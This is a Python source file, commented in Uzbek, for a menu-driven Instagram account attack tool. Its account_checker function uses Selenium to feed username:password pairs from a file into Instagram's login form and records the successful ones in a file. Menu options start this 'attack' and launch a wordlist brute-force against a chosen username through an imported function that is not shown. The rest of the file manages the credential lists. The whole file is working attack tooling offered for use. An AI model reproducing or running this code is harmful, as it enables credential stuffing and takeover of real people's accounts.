from time import sleep
from os import system
from datetime import datetime
import requests
from feature import brute_force_account, installer

def test_connection() -> bool: # Bu funksiya boolen ko'rinishida qaytadi
    """PC internetga ulanganmi yoki yo'qligini tekshiradi"""
    try:    
        get = requests.get("https://www.google.com")
        return True #Ulangan bo'lsa True
    except requests.exceptions.ConnectionError as e:
        print("Dastur to'xtadi..")    
        return False # Aks holda False qaytadi.
    

def account_checker(path):
    """Selenuym kutubxonasi yordamida akkauntlarni tekshirish"""
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.common.keys import Keys
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    driver = webdriver.Chrome()
    driver.get('https://www.instagram.com/')
    now = datetime.now()
    date_time = now.strftime("%H:%M:%S")
    print(f"[+][{date_time}]**********Ishga tushdi...***********[+]")
    
    sleep(2)
    with open(path, 'r') as file:
        lines = file.readlines()
    
    for line in lines:
        parts = line.strip().split(":")
        if len(parts) < 2:
            print(f"[+][{date_time}]**********Parol yoki login mavjud emas: {line.strip()}**********[+]")
            
        else:
            try:

                username, password = parts
            except ValueError:
                print(f"[+][{date_time}]********** Qiymatlar 2 tadan oshib ketdi🛠️ O'tkazib yuborildi..********** [+]")

            if len(password) < 8:
                print(f"[+][{date_time}]**********Parol 8 xonadan kichik o'tkazib yuboriladi..**********[+]")
                
                continue
            else:

                driver.find_element(By.XPATH, '//*[@id="loginForm"]/div/div[1]/div/label/input').send_keys(username)
                sleep(2)
                driver.find_element(By.XPATH, '//*[@id="loginForm"]/div/div[2]/div/label/input').send_keys(password)
                sleep(2)
                driver.find_element(By.XPATH, '//*[@id="loginForm"]/div/div[3]').click()
                try:
                    # Xatolik xabarini kutish
                    error_message = WebDriverWait(driver, 10).until(
                        EC.presence_of_element_located((By.XPATH, '//*[@id="loginForm"]/span/div'))
                    )
                    print(f"[+][{date_time}]********** Xatolik: Login yoki parol xato🚫 Username: {username}  Password: {password}**********[+]")
                    
                    sleep(3)
                    driver.refresh()
                except:
                    import os
                    print(f"[+][{date_time}]********** Kirish muvaffaqiyatli: {username} password: {password}✅ **********[+]")
                    driver.refresh()
                    driver.get('https://www.instagram.com/')
                    new_line = os.linesep
                    with open('chiqdi.txt', 'a+') as file:
                        file.write(f'{username}:{password}' + new_line)
    
        sleep(5)
    
    sleep(1)


       




def delete_all(path):
    """Butun fayllarni tozalash"""
    import os
    now = datetime.now()
    date_time = now.strftime("%H:%M:%S")
    os.remove(path)
    print(f"[+][{date_time}]********** {path} file o'chirildi!🧹 **********[+]")


def is_txt_file_found() -> bool:
    """Fayl bor yo'qligini tekshirish"""
    try:

        with open('accounts.txt') as file:
            return True
    except FileNotFoundError:
        return False
    
def remove_dublicate_accounts(path):
    """Dublikat akkauntlarni o'chirish"""
    now = datetime.now()
    date_time = now.strftime("%H:%M:%S")
    try:
        
        with open(path, 'r') as file:
            lines = file.read().splitlines()

        # Convert the list to a set to remove duplicates
            unique_lines = set(lines)

        # Convert the set back to a list to preserve order
            unique_lines = list(unique_lines)

        # Write the unique lines to a new file
            with open(path, 'w') as file:
                file.write('\n'.join(unique_lines) + '\n')

                print(f"[+][{date_time}]********** Dublikat akkauntlar tozalandi🧹 **********[+]")
    except FileNotFoundError:
        if is_txt_file_found():
            print("")
        else:

            print(f"[+][{date_time}]********** File yaratilmoqda.. **********[+]")
    

def account_with_password(path):
    """Akkauntni paroli bor yo'qligiga ishonch hosil qilish"""
    now = datetime.now()
    date_time = now.strftime("%H:%M:%S")
    try:
        with open(path, '+r') as fi:
            lines = [line.rstrip() for line in fi]

            output_lines = []

            for line in lines:
                # Har bir satrni ":"ga ajratish
                parts = line.strip().split(":")
                
                # Agar password mavjud bo'lmasa
                if len(parts) < 2:
                    print(f"[+][{date_time}]********** Parol mavjud emas!: {line.strip()} **********[+]")
                    print(f"[+][{date_time}]********** O'chirildi🧹 **********[+]")
                else:
                    username, password = parts
                    if password:
                        output_lines.append(f"{username}:{password}\n")
                    else:
                        print(f"[+][{date_time}]********** Username mavjud emas: {username} **********[+]")
                        print(f"[+][{date_time}]********** O'chirildi🧹 **********[+]")

            # Yangi faylga yozish
            with open("accounts.txt", "w") as file:
                file.writelines(output_lines)
    except FileNotFoundError:
        print(f"[+][{date_time}]********** File mavjud emas!🔍 **********[+]")



def clear_cache_functions():
    import os
    now = datetime.now()
    date_time = now.strftime("%H:%M:%S")
    os.remove('test_accounts.txt')
    print("[+]********** Deleted test_accounts.txt file success✅ **********[+]")
    sleep(3)
    print(f"[+][{date_time}]********** Cache cleared **********[+]")


def menu():
    """Menu qismi"""
    banner = '''

 ____             _         ______                   _____           _        
|  _ \           | |       |  ____|                 |_   _|         | |       
| |_) |_ __ _   _| |_ ___  | |__ ___  _ __ ___ ___    | |  _ __  ___| |_ __ _ 
|  _ <| '__| | | | __/ _ \ |  __/ _ \| '__/ __/ _ \   | | | '_ \/ __| __/ _` |
| |_) | |  | |_| | ||  __/ | | | (_) | | | (_|  __/  _| |_| | | \__ \ || (_| |
|____/|_|   \__,_|\__\___| |_|  \___/|_|  \___\___| |_____|_| |_|___/\__\__,_|

    Developer: Asadbek Abdubannopov                                                                       

    '''
    print(banner)
    
    while True:
        now = datetime.now()
        date_time = now.strftime("%H:%M:%S")
        print(f"[+][{date_time}]************* Looking the menu *************[+]")
        print(f"[+][{date_time}]************* Warning! Dastur xatosiz ishlashi uchun internet tezligi min: 5.0 -> 8.0 mb/s *************[+]")
        print("""                [1] Starting attack ☠️
                [2] Remove duplicate accounts 📚
                [3] All accounts 💻
                [4] Delete all 🚫
                [5] Clear cache 🧹
                [6] Brute Force account with wordlist🔍 
                [7] Installing packets 🛠️
                [99] Exit
            
            """)
        menu = int(input("[=]Menu: "))
        if menu == 99:
            print("Stopped🚫")
            break
        elif menu == 2:
            path = input("Fayl nomi🔍: ")
            remove_dublicate_accounts(path=path)

        elif menu == 3:
            path = input("Fayl nomi🔍: ")
            account_with_password(path=path)
        elif menu == 4:
            path = input("Fayl nomi🔍:")
            print("Siz rostan ham o'chirmoqchimisz🧹")
            answer = input("Yes[Y] / No[N] ")
            if answer == 'Y' or 'y':
                delete_all(path)
            else:
                print("Bekor qilindi🚫")
        elif menu == 1:
            path = input("Fayl nomi🔍: ")
            account_checker(path)
        elif menu == 5:
            clear_cache_functions()
        elif menu == 6:
            
            username = input("☠️Instagram username for attack:")
            wordlist = input("📖Wordlist path (Enter: default wordlist): ")
            brute_force_account(username=username, wordlist_path=wordlist)
        elif menu == 7:
            installer()

        else:
            print("Bunday menu mavjud emas!🚫")




if __name__ == '__main__':
    if test_connection():
        menu()
    else:
        print("Connection Error! Iltimos internetga ulaning📡")    
